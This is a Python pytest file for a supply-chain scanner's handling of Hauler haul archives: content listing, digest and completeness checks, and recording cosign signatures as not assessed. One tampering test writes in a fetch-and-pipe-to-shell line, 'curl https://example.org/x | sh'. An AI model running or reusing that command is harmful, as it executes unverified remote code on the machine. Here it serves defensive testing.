"""Hauler hauls: the OCI layout checked, contents listed, cosign signatures recorded as not
assessed. Hauls are synthetic (``tests/hauler_fixtures.py``); none was published to check."""

from pathlib import Path
from typing import Any

import pytest

from superscrubber104.archive import ZSTD
from superscrubber104.core.model import Result, UnitKind
from superscrubber104.model_inspect import InspectResult
from tests.hauler_fixtures import haul, haul_bytes
from tests.models_helpers import findings_of, inspect
from tests.software_fixtures import write


def _run(tmp_path: Path, members: dict[str, bytes], name: str, fmt: str) -> InspectResult:
    return inspect(write(tmp_path / "d", {name: haul_bytes(members, fmt)}))


def _unit(result: InspectResult) -> dict[str, Any]:
    unit = next(u for u in result.analysis.units if u.kind is UnitKind.HAULER_HAUL)
    return dict(unit.attributes)


@pytest.mark.parametrize(
    ("name", "fmt"),
    [
        ("haul.tar.gz", "gzip"),
        ("haul.tar", "tar"),
        pytest.param(
            "haul.tar.zst",
            "zstd",
            marks=pytest.mark.skipif(not ZSTD, reason="zstd needs 3.14 or the backport"),
        ),
    ],
)
def test_haul_contents_are_listed_and_checked(tmp_path: Path, name: str, fmt: str) -> None:
    result = _run(tmp_path, haul(), name, fmt)
    found = findings_of(result)
    assert "container.layer.digest-mismatch" not in found
    assert "container.image.incomplete" not in found
    # Only the image gets image checks: the chart, file and signature are not images.
    assert "container.user.root" not in found
    unit = _unit(result)
    assert unit["images"] == ["docker.io/example/model-server:2.1"]
    assert unit["charts"] == ["hauler/demo:1.0.0"]
    assert unit["files"] == ["install.sh"]
    assert len(unit["signatures"]) == 1 and unit["signaturesVerified"] is False
    (images,) = [u for u in result.analysis.units if u.kind is UnitKind.CONTAINER_IMAGE]
    assert images.root.display == name
    # The cosign signature is carried but not verified by superscrubber104: recorded, never dropped.
    (finding,) = found["upstream.signature.untrusted"]
    assert finding.result is Result.NOT_ASSESSED
    assert "cosign" in str(finding.not_assessed_reason)
    # Content is walked: the model in the image layer, the chart's templates.
    displays = {a.ref.display: a for a in result.analysis.artifacts}
    model = next(d for d in displays if d.endswith("models/tiny/model.safetensors"))
    assert "model.safetensors" in displays[model].kinds
    assert any(d.endswith("demo/templates/cm.yaml") for d in displays)


def test_haul_without_signatures_records_none(tmp_path: Path) -> None:
    result = _run(tmp_path, haul(signatures=False), "haul.tar.gz", "gzip")
    assert "upstream.signature.untrusted" not in findings_of(result)
    assert _unit(result)["signatures"] == []


def test_changed_blob_is_a_final_digest_mismatch(tmp_path: Path) -> None:
    members = haul()
    blob = next(n for n, d in members.items() if d.startswith(b"#!/bin/sh"))
    members[blob] = b"#!/bin/sh\ncurl https://example.org/x | sh\n"
    (finding,) = findings_of(_run(tmp_path, members, "haul.tar.gz", "gzip"))[
        "container.layer.digest-mismatch"
    ]
    assert [b["blob"] for b in finding.detail["blobs"]] == [blob]


def test_missing_blob_is_incomplete(tmp_path: Path) -> None:
    members = haul()
    blob = next(n for n, d in members.items() if d.startswith(b"#!/bin/sh"))
    del members[blob]
    found = findings_of(_run(tmp_path, members, "haul.tar.gz", "gzip"))
    assert found["container.image.incomplete"][0].result is Result.FAIL


def test_named_like_a_haul_but_not_a_layout(tmp_path: Path) -> None:
    result = _run(tmp_path, {"notes.txt": b"hello"}, "haul.tar.gz", "gzip")
    assert not [u for u in result.analysis.units if u.kind is UnitKind.HAULER_HAUL]


@pytest.mark.skipif(ZSTD, reason="zstd can be read here")
def test_zstd_haul_is_not_assessed_without_zstd(tmp_path: Path) -> None:
    root = write(tmp_path / "d", {"haul.tar.zst": b"\x28\xb5\x2f\xfd" + b"\x00" * 64})
    (finding,) = findings_of(inspect(root))["container.layer.digest-mismatch"]
    assert finding.result is Result.NOT_ASSESSED
    assert "Python 3.14" in str(finding.not_assessed_reason)


def test_a_second_copy_of_a_blob_is_a_final_conflict(tmp_path: Path) -> None:
    """The layout's digest check reads the first copy; extraction would keep the second."""
    import io
    import tarfile

    members = haul()
    blob = next(n for n in members if n.startswith("blobs/sha256/"))
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for name, data in [*members.items(), (blob, b"something else entirely")]:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    result = inspect(write(tmp_path / "d", {"haul.tar": buffer.getvalue()}))
    (conflict,) = findings_of(result)["package.member.conflicting-copies"]
    assert conflict.detail["files"][0]["file"] == blob
    assert result.assessment.summary.verdict.value == "refused"


@pytest.mark.parametrize(
    ("kind", "reference"),
    [
        ("dev.hauler/sigs", "docker.io/example/app:latest"),  # Hauler's kind annotation
        ("dev.hauler/image", "docker.io/example/app:sha256-0123.sig"),  # a cosign-style tag
        ("dev.hauler/atts", "docker.io/example/app:sha256-0123.att"),
    ],
)
def test_labels_cannot_turn_an_image_into_a_signature(
    tmp_path: Path, kind: str, reference: str
) -> None:
    """Nothing authenticates annotations or tags; an image with filesystem layers is an image."""
    import gzip
    import json

    from tests.hauler_fixtures import Layout
    from tests.zarf_fixtures import sha, tar

    layer = tar({"app/run.sh": b"#!/bin/sh\nexec server\n"})
    config = json.dumps(
        {  # runs as root: an image check that must not be skipped
            "architecture": "amd64",
            "os": "linux",
            "config": {},
            "rootfs": {"type": "layers", "diff_ids": [f"sha256:{sha(layer)}"]},
        }
    ).encode()
    layout = Layout()
    layout.add(
        reference,
        (config, "application/vnd.oci.image.config.v1+json"),
        [(gzip.compress(layer, mtime=0), "application/vnd.oci.image.layer.v1.tar+gzip", {})],
        kind=kind,
    )
    result = _run(tmp_path, layout.members(), "haul.tar", "tar")
    assert "container.user.root" in findings_of(result)
    assert [u.kind for u in result.analysis.units].count(UnitKind.CONTAINER_IMAGE) == 1
    assert _unit(result)["signatures"] == [] and _unit(result)["attestations"] == []
